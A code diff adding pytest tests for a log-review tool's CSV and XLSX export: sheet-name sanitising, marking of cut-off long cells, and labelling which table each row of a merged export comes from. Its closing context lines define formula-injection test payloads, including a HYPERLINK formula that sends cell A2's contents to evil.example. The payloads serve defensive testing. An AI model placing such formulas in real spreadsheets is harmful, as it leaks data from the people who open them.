@@ -97,6 +97,70 @@ def test_csv_export_includes_derived_columns(store, write_csv):
     assert lines[1].endswith(",a.example") and lines[2].endswith(",b.example")
 
 
+def test_xlsx_sheet_names_survive_control_characters_truncation_and_reserved_names(store, write_csv, tmp_path):
+    """A sheet name is XML text in workbook.xml: a BEL in a source name
+    (names keep what the file was called) produced a workbook that would
+    not open again. The 31-character cut could also end a name in an
+    apostrophe Excel refuses there, and "History" is reserved."""
+    path = write_csv([["a"], ["1"]], name="x.csv")
+    tag = store.upsert_tag(None, "T", "#000000", None)
+    for name in ["evil\x07name.csv", "A" * 30 + "'s log.csv", "History"]:
+        sid = store.ingest_csv(path, name=name, build_fts=False)["id"]
+        store.set_tags(sid, [1], tag["id"], True)
+
+    tagged = load_workbook(store.export_tagged_xlsx()).sheetnames
+    out = tmp_path / "all.xlsx"
+    store.export_all_xlsx(str(out))
+    for names in (tagged, load_workbook(str(out)).sheetnames):
+        assert len(names) == 3
+        for n in names:
+            assert len(n) <= 31 and not n.startswith("'") and not n.endswith("'")
+            assert not any(ord(ch) < 32 for ch in n)
+            assert n.lower() != "history"
+        assert names[0] == "evil_name.csv"
+
+
+def test_xlsx_cell_too_long_for_excel_is_marked_not_silently_cut(store, write_csv):
+    """Excel holds 32,767 characters per cell and openpyxl cut longer
+    values there without a word — an encoded command line that looks
+    complete and isn't. The cut is marked, and says how long it was."""
+    path = write_csv([["cmd"], ["A" * 40000], ["short"]], name="long.csv")
+    sid = store.ingest_csv(path, name="long.csv", build_fts=False)["id"]
+    tag = store.upsert_tag(None, "T", "#000000", None)
+    store.set_tags(sid, [1, 2], tag["id"], True)
+    ws = load_workbook(store.export_tagged_xlsx()).worksheets[0]
+    cell = ws["D2"].value
+    assert len(cell) <= 32767
+    assert cell.startswith("A" * 30000) and "cut" in cell and "40,000" in cell
+    assert ws["D3"].value == "short"
+
+
+def test_csv_export_of_a_merge_says_which_table_each_row_is_from(store, write_csv):
+    """Line is a rid within ONE member, so a merged export had two rows
+    reading "Line 1" and nothing saying which file either came from. A
+    merge's export names the member (as the sidebar does, nickname
+    first); a single table's export is unchanged."""
+    a = store.ingest_csv(write_csv([["user"], ["alice"], ["bob"]], name="hostA.csv"),
+                         name="hostA_Security.csv", build_fts=False)["id"]
+    b = store.ingest_csv(write_csv([["user"], ["carol"], ["dave"]], name="hostB.csv"),
+                         name="hostB_Security.csv", build_fts=False)["id"]
+    store.set_source_nickname(b, "Host B")
+    tag = store.upsert_tag(None, "Keep", "#ff0000", None)
+    store.set_tags(a, [1], tag["id"], True)
+    store.set_tags(b, [1], tag["id"], True)
+    mid = store.create_merge("M", [a, b])["id"]
+    view = store.build_view(mid, {"filters": [], "sort": [{"column": "user", "dir": "asc"}]})
+
+    rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"], tagged_only=True))))
+    assert rows[0] == ["Line", "Table", "Tags", "Note", "user"]
+    assert rows[1:] == [["1", "hostA_Security.csv", "Keep", "", "alice"],
+                        ["1", "Host B", "Keep", "", "carol"]]
+
+    single = store.build_view(a, {"filters": [], "sort": [{"column": "user", "dir": "asc"}]})
+    assert next(csv.reader(io.StringIO(_export_csv_text(store, single["view_id"])))) == \
+        ["Line", "Tags", "Note", "user"]
+
+
 FORMULA_HEADER = '=HYPERLINK("http://evil.example/?"&A2,"click")'
 FORMULA_TAG = '=HYPERLINK("http://evil.example","open")'
 
